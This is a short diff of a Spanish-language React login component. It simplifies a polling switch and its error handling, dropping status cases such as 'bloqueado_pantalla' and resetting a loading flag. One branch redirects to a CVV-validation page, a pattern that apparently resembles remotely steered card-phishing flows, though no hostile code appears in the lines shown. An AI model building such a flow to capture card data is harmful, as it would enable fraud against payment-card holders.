@@ -627,21 +627,19 @@ export default function IniciarSesion() {
           // Redirige a validación con error
           redirigir(`/validacion-cvv?error=true`);
           break;
-
-        // ------------ CASOS ADICIONALES ------------
-        case 'aprobado':
-        case 'pendiente':
-        case 'error_pantalla':
-        case 'bloqueado_pantalla':
         default:
+
+          // Se quita el cargando
+          setCargando(false);
+
+          // Se sale del ciclo
           break;
-      }
+      };
     } catch (error) {
-      console.error('💥 [POLLING] Error:', {
-        mensaje: error.message,
-        status: error.response?.status
-      });
-    }
+
+      // Se quita el estado de cargando
+      setCargando(false);
+    };
   };
 
   // Helper para redirección suave
